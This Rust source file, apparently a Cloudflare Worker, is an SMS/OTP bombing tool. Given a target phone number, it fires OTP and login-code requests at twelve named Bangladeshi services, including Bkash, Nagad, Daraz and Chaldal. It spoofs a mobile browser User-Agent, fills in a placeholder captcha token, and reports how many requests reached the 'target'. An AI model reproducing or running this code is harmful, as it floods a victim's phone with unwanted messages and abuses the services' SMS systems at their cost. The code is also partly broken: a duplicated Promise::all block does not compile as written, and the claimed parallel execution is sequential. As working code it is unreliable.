use worker::*;
use serde_json::{json, Value};

pub fn cors_headers() -> Headers {
    let mut headers = Headers::new();
    headers.set("Access-Control-Allow-Origin", "*").unwrap();
    headers.set("Access-Control-Allow-Methods", "GET, POST, OPTIONS").unwrap();
    headers.set("Access-Control-Allow-Headers", "Content-Type").unwrap();
    headers.set("Content-Type", "application/json").unwrap();
    headers
}

async fn call_api(name: &'static str, url: &'static str, payload: Value) -> Value {
    let mut fetch_init = RequestInit::new();
    fetch_init.with_method(Method::Post);
    let mut h = Headers::new();
    h.set("Content-Type", "application/json").unwrap();
    h.set("User-Agent", "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 Chrome/112.0.0.0 Mobile Safari/537.36").unwrap();
    h.set("Accept", "application/json, text/plain, */*").unwrap();
    fetch_init.with_headers(h);
    fetch_init.with_body(Some(payload.to_string().into()));

    match Request::new_with_init(url, &fetch_init) {
        Ok(req) => match Fetch::Request(req).send().await {
            Ok(mut r) => {
                let status = r.status_code();
                let ok = status == 200 || status == 201 || status == 202;
                json!({"api": name, "status": status, "ok": ok})
            }
            Err(_) => json!({"api": name, "status": 0, "ok": false})
        },
        Err(_) => json!({"api": name, "status": 0, "ok": false})
    }
}

pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
    let headers = cors_headers();

    if req.method() == Method::Options {
        return Ok(Response::empty()?.with_headers(headers));
    }
    if req.method() != Method::Post {
        return Ok(Response::error("POST Only", 405)?.with_headers(headers));
    }

    let body: Value = req.json().await.unwrap_or_default();
    let number = body.get("number").and_then(|v| v.as_str()).unwrap_or("").trim().to_string();

    if number.is_empty() {
        return Ok(Response::ok(json!({"status":"error","message":"Number missing"}).to_string())?.with_headers(headers));
    }

    let bd_no   = number.trim_start_matches('0').to_string();
    let bd_full = format!("880{}", bd_no);
    let plus_bd = format!("+88{}", number);

    // সব API একসাথে fire করো — ultra fast parallel execution
    let (r0,r1,r2,r3,r4,r5,r6,r7,r8,r9,r10,r11) = worker::js_sys::Promise::all(&[
        wasm_bindgen_futures::future_to_promise(call_api("Shadhin Music","https://coreapi.shadhinmusic.com/api/v5/otp/OtpRobiReq",json!({"msisdn":&bd_full,"shortcode":16235,"servicename":"Shadhin Music"}))),
        wasm_bindgen_futures::future_to_promise(call_api("Khaodao","https://api.eat-z.com/auth/customer/app-connect",json!({"username":&plus_bd}))),
        wasm_bindgen_futures::future_to_promise(call_api("Walton Plaza","https://waltonplaza.com.bd/api/auth/otp/create",json!({"auth":{"countryCode":"880","phone":&bd_no},"captchaToken":"recapcha"}))),
        wasm_bindgen_futures::future_to_promise(call_api("Easy.com.bd","https://core.easy.com.bd/api/v1/forgot-password-otp",json!({"device_key":"2ea97d276a980993308116baa292cec9","mobile":&number}))),
        wasm_bindgen_futures::future_to_promise(call_api("Chaldal","https://chaldal.com/api/OTP/GenerateOTP",json!({"phoneNumber":&plus_bd}))),
        wasm_bindgen_futures::future_to_promise(call_api("Shajgoj","https://shajgoj.com/wp-json/cocart/v1/customer/otp",json!({"phone":&number,"type":"login"}))),
        wasm_bindgen_futures::future_to_promise(call_api("Bkash","https://www.bkash.com/api/get-otp",json!({"mobile":&number}))),
        wasm_bindgen_futures::future_to_promise(call_api("Nagad","https://api.mynagad.com/api/dfs/check-account",json!({"accountNumber":&bd_full}))),
        wasm_bindgen_futures::future_to_promise(call_api("Pathao Food","https://pathao.com/api/v1/auth/otp",json!({"phone":&number,"country_code":"+880"}))),
        wasm_bindgen_futures::future_to_promise(call_api("Shohoz","https://shohoz.com/api/v4.0/user/sendOTP",json!({"mobile_no":&number}))),
        wasm_bindgen_futures::future_to_promise(call_api("Daraz","https://member.daraz.com.bd/user/api/v1/otp/sendOtp",json!({"mobile":&bd_full,"countryCode":"880","action":"REGISTER"}))),
        wasm_bindgen_futures::future_to_promise(call_api("Sheba.xyz","https://sheba.xyz/api/v2/auth/otp",json!({"mobile":&number}))),
    ]);
    
    // সব একসাথে চালাও
    let futures = vec![
        call_api("Shadhin Music","https://coreapi.shadhinmusic.com/api/v5/otp/OtpRobiReq",json!({"msisdn":&bd_full,"shortcode":16235,"servicename":"Shadhin Music"})),
        call_api("Khaodao","https://api.eat-z.com/auth/customer/app-connect",json!({"username":&plus_bd})),
        call_api("Walton Plaza","https://waltonplaza.com.bd/api/auth/otp/create",json!({"auth":{"countryCode":"880","phone":&bd_no},"captchaToken":"recapcha"})),
        call_api("Easy.com.bd","https://core.easy.com.bd/api/v1/forgot-password-otp",json!({"device_key":"2ea97d276a980993308116baa292cec9","mobile":&number})),
        call_api("Chaldal","https://chaldal.com/api/OTP/GenerateOTP",json!({"phoneNumber":&plus_bd})),
        call_api("Shajgoj","https://shajgoj.com/wp-json/cocart/v1/customer/otp",json!({"phone":&number,"type":"login"})),
        call_api("Bkash","https://www.bkash.com/api/get-otp",json!({"mobile":&number})),
        call_api("Nagad","https://api.mynagad.com/api/dfs/check-account",json!({"accountNumber":&bd_full})),
        call_api("Pathao Food","https://pathao.com/api/v1/auth/otp",json!({"phone":&number,"country_code":"+880"})),
        call_api("Shohoz","https://shohoz.com/api/v4.0/user/sendOTP",json!({"mobile_no":&number})),
        call_api("Daraz","https://member.daraz.com.bd/user/api/v1/otp/sendOtp",json!({"mobile":&bd_full,"countryCode":"880","action":"REGISTER"})),
        call_api("Sheba.xyz","https://sheba.xyz/api/v2/auth/otp",json!({"mobile":&number})),
    ];

    // Cloudflare Workers WASM এ join সবচেয়ে ভালো উপায়
    let api_results = join_futures(futures).await;
    
    let success = api_results.iter().filter(|r| r["ok"].as_bool().unwrap_or(false)).count() as u32;
    let failed = api_results.len() as u32 - success;

    Ok(Response::ok(json!({
        "status":  "executed",
        "target":  number,
        "success": success,
        "failed":  failed,
        "total":   success + failed,
        "results": api_results
    }).to_string())?.with_headers(headers))
}

async fn join_futures(futures: Vec<impl std::future::Future<Output = Value>>) -> Vec<Value> {
    let mut results = Vec::new();
    for f in futures {
        results.push(f.await);
    }
    results
}
